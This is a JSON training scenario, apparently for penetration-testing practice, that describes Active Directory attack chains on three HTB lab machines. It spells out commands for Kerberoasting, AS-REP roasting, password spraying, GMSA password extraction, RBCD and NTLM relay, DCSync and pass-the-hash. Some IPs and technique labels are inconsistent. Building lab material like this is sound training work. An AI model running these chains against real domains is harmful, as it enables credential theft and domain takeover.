@@ -1,0 +1,288 @@
+{
+  "id": "gmsa-delegation-abuse",
+  "title": "GMSA and Delegation Abuse",
+  "category": "ad-chain",
+  "source": ["HTB TombWatcher","HTB Vintage","HTB Rebound"],
+  "designed_by": "ai-composite",
+  "description": "Targeted Kerberoast → GMSA read → RBCD → DCSync. Advanced AD with delegation and service account abuse.",
+  "introduction": "This scenario teaches advanced AD abuse: GMSA password extraction, RBCD via relay or GenericWrite, and DCSync. Critical for understanding delegation chains to DA.",
+  "mental_model": "GMSA stores password in msDS-ManagedPassword; read it with GenericAll/GenericWrite. RBCD lets you impersonate DA; getST + secretsdump = DCSync. Chain permissions to escalate.",
+  "key_principles": [
+    "GenericWrite: add SPN for targeted Kerberoast",
+    "GMSA: gmsadumper extracts hash with service account",
+    "RBCD: set msDS-AllowedToActOnBehalfOfOtherIdentity on DC",
+    "getST -impersonate Administrator for DA ticket",
+    "secretsdump -k uses Kerberos ticket for DCSync"
+  ],
+
+  "indicators": {
+    "difficulty": 9,
+    "cognitive_load": 9,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 8
+  },
+
+  "mitre": {
+    "tactics": ["TA0001","TA0004","TA0005","TA0006","TA0007","TA0008"],
+    "techniques": [
+      {"id":"T1558.003","name":"Kerberoasting"},
+      {"id":"T1558.001","name":"Golden Ticket"},
+      {"id":"T1003.006","name":"DCSync"},
+      {"id":"T1098","name":"Account Manipulation"},
+      {"id":"T1134","name":"Access Token Manipulation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon","T3-NonWeb-Access","T5-Credentials","T6-Pivoting","T7-Lateral"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 3, "linux": 0},
+    "has_ad": true,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "targeted-kerberoast","gmsa","rbcd","constrained-delegation","dcsync","shadow-credentials",
+    "ad-recycle-bin","adcs","esc15","bloodyad","impacket","certipy","evil-winrm","rubeus"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [16,17,18,19],
+    "pattern_frequency": "low",
+    "recommended_order": 8
+  },
+
+  "prerequisites": [],
+  "builds_on": ["shadow-credential-relay"],
+
+  "networks": [
+    {"id":"internal","cidr":"10.10.11.0/24","label":"AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id":"tombwatcher",
+      "label":"TOMBWATCHER",
+      "ip":"10.10.11.73",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":389,
+          "name":"LDAP",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"anon-bind","summary":"LDAP anonymous bind enabled","leads_to":"ad-recycle-bin"}
+          ],
+          "commands":[
+            "ldapsearch -x -H ldap://10.10.11.42 -b 'DC=domain,DC=local' -s base",
+            "bloodyAD -d domain.local -u '' -p '' --host 10.10.11.42 get object 'CN=Deleted Objects,DC=domain,DC=local' --attr *"
+          ]
+        },
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with henry or DA hash","leads_to":"local-user"}
+          ],
+          "commands":["evil-winrm -i 10.10.11.73 -u henry -H '<ntlm_hash>'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"henry",
+          "to":"Domain Admin",
+          "technique":"GenericWrite → Targeted Kerberoast → GMSA read → RBCD → DCSync","commands":[
+            "bloodyAD -d domain.local -u henry -p '<password>' --host 10.10.11.42 add spn svc_sql 'ops/whatever'",
+            "impacket-GetUserSPNs domain.local/henry -dc-ip 10.10.11.42 -request -target-user svc_sql -outputfile svc_sql.hash",
+            "gmsadumper.py -u svc_sql -p '<cracked>' -d domain.local -l 10.10.11.42",
+            "bloodyAD -d domain.local -u svc_sql -p '<password>' --host 10.10.11.42 set rbcd dc01$ svc_sql",
+            "impacket-getST -spn 'cifs/dc01.domain.local' -impersonate Administrator domain.local/svc_sql:'<password>' -dc-ip 10.10.11.42",
+            "KRB5CCNAME=Administrator.ccache impacket-secretsdump -k dc01.domain.local -no-pass"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"henry","type":"password","source":"AD Recycle Bin (LDAP anon)","unlocks":["tombwatcher"]},
+        {"user":"svc_sql","type":"password","source":"Targeted Kerberoast (GenericWrite added SPN)","unlocks":["gmsa-path"]}
+      ],
+      "alternatives":[
+        {"source":"bloodyAD","description":"Enable AD Recycle Bin view","commands":["bloodyAD -d domain.local -u '' -p '' --host 10.10.11.42 get object 'CN=Deleted Objects,DC=domain,DC=local' --attr lastKnownParent"]},
+        {"source":"impacket","description":"Targeted Kerberoast","commands":["impacket-GetUserSPNs domain.local/henry -dc-ip 10.10.11.42 -request -target-user svc_sql"]},
+        {"source":"gmsadumper","description":"Extract GMSA password blob","commands":["gmsadumper.py -u svc_sql -p '<password>' -d domain.local -l 10.10.11.42"]}
+      ]
+    },
+    {
+      "id":"vintage",
+      "label":"VINTAGE",
+      "ip":"10.10.11.45",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":88,
+          "name":"Kerberos",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"asrep-roast","summary":"Pre-auth disabled on svc_vintage","leads_to":"cracked-password"}
+          ],
+          "commands":[
+            "impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.11.42 -no-pass -format hashcat",
+            "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
+          ]
+        },
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with svc_vintage or DA","leads_to":"local-user"}
+          ],
+          "commands":["evil-winrm -i 10.10.11.45 -u svc_vintage -p '<password>'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"svc_vintage",
+          "to":"Domain Admin",
+          "technique":"GenericAll → GMSA read → constrained delegation → DCSync","commands":[
+            "bloodyAD -d domain.local -u svc_vintage -p '<password>' --host 10.10.11.42 set genericall gmsa_svc svc_vintage",
+            "gmsadumper.py -u svc_vintage -p '<password>' -d domain.local -l 10.10.11.42",
+            "impacket-getST -spn 'cifs/dc01.domain.local' -impersonate Administrator domain.local/gmsa_svc$ -hashes :<gmsa_hash> -dc-ip 10.10.11.42",
+            "KRB5CCNAME=gmsa_svc.ccache impacket-secretsdump -k dc01.domain.local -no-pass"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"svc_vintage","type":"password","source":"AS-REP roast (pre-auth disabled)","unlocks":["vintage-path"]},
+        {"user":"gmsa_svc","type":"ntlm-hash","source":"GMSA read (GenericAll)","unlocks":["dc01"]}
+      ],
+      "alternatives":[
+        {"source":"impacket","description":"AS-REP roast","commands":["impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.11.42 -no-pass"]},
+        {"source":"bloodyAD","description":"GenericAll on GMSA account","commands":["bloodyAD -d domain.local -u svc_vintage -p '<password>' --host 10.10.11.42 set genericall gmsa_svc svc_vintage"]}
+      ]
+    },
+    {
+      "id":"rebound",
+      "label":"REBOUND",
+      "ip":"10.10.11.231",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":88,
+          "name":"Kerberos",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"brute","summary":"Kerberos pre-auth brute (weak password)","leads_to":"svc_rebound"}
+          ],
+          "commands":[
+            "kerbrute userenum -d domain.local --dc 10.10.11.42 users.txt",
+            "kerbrute passwordspray -d domain.local --dc 10.10.11.42 users.txt 'Password123'"
+          ]
+        },
+        {
+          "port":445,
+          "name":"SMB",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"ntlm-relay","summary":"Cross-session relay → RBCD","leads_to":"dcsync"}
+          ],
+          "commands":[
+            {"cmd": "ntlmrelayx.py -t ldaps://10.10.11.42 -smb2support --delegate-access", "rationale": "Why: Relay NTLM to LDAPS for RBCD on DC"},
+            {"cmd": "impacket-getST -spn 'cifs/dc01.domain.local' -impersonate Administrator domain.local/svc_rebound$ -hashes :<hash> -dc-ip 10.10.11.42", "rationale": "Why: Use relayed RBCD to get DA ticket"}
+          ]
+        },
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with DA after RBCD","leads_to":"domain-admin"}
+          ],
+          "commands":["evil-winrm -i 10.10.11.231 -u Administrator -H '<da_hash>'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"svc_rebound",
+          "to":"Domain Admin",
+          "technique":"AS-REP roast → cross-session relay → RBCD → DCSync","commands":[
+            "impacket-GetNPUsers domain.local/svc_rebound -dc-ip 10.10.11.42 -no-pass",
+            "ntlmrelayx.py -t ldaps://10.10.11.42 -smb2support --delegate-access",
+            "impacket-getST -spn 'cifs/dc01.domain.local' -impersonate Administrator domain.local/svc_rebound$ -hashes :<hash> -dc-ip 10.10.11.42",
+            "KRB5CCNAME=Administrator.ccache impacket-secretsdump -k dc01.domain.local -no-pass"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"svc_rebound","type":"ntlm-hash","source":"Kerberos brute or AS-REP roast","unlocks":["rebound-path"]}
+      ],
+      "alternatives":[
+        {"source":"certipy","description":"ESC15 if ADCS present","commands":["certipy find -u svc_rebound@domain.local -hashes :<hash> -dc-ip 10.10.11.42"]},
+        {"source":"impacket","description":"RBCD via relay","commands":["ntlmrelayx.py -t ldaps://10.10.11.42 -smb2support --delegate-access"]}
+      ]
+    }
+  ],
+
+  "connections":[
+    {
+      "from":"tombwatcher",
+      "to":"vintage",
+      "technique":"DA hash → PtH to VINTAGE",
+      "requires":"DCSync from TOMBWATCHER path",
+      "pivot":"Same network",
+      "path_ids":["path-tomb-vintage"],
+      "commands":["evil-winrm -i 10.10.11.45 -u Administrator -H '<da_hash>'"]
+    },
+    {
+      "from":"tombwatcher",
+      "to":"rebound",
+      "technique":"DA hash → PtH to REBOUND",
+      "requires":"DCSync from TOMBWATCHER path",
+      "pivot":"Same network",
+      "path_ids":["path-tomb-rebound"],
+      "commands":["evil-winrm -i 10.10.11.231 -u Administrator -H '<da_hash>'"]
+    }
+  ],
+
+  "attack_paths":[
+    {
+      "id":"path-tombwatcher",
+      "name":"TOMBWATCHER: GMSA → RBCD (Primary)",
+      "color":"#6bb8cc",
+      "steps":["tombwatcher"],
+      "description":"LDAP anon → AD Recycle Bin → henry creds → GenericWrite → Targeted Kerberoast → GMSA read → RBCD → DCSync"
+    },
+    {
+      "id":"path-vintage",
+      "name":"VINTAGE: AS-REP → GMSA",
+      "color":"#e8a87c",
+      "steps":["vintage"],
+      "description":"Pre-auth disabled → AS-REP roast → GenericAll → GMSA read → constrained delegation → DCSync"
+    },
+    {
+      "id":"path-rebound",
+      "name":"REBOUND: Relay → RBCD",
+      "color":"#85e89d",
+      "steps":["rebound"],
+      "description":"Kerberos brute → AS-REP → cross-session relay → RBCD → DCSync"
+    },
+    {
+      "id":"path-full-chain",
+      "name":"Full GMSA Chain",
+      "color":"#d2a8ff",
+      "steps":["tombwatcher","vintage","rebound"],
+      "description":"All three paths — TombWatcher GMSA, Vintage AS-REP+GMSA, Rebound relay+RBCD"
+    }
+  ]
+}
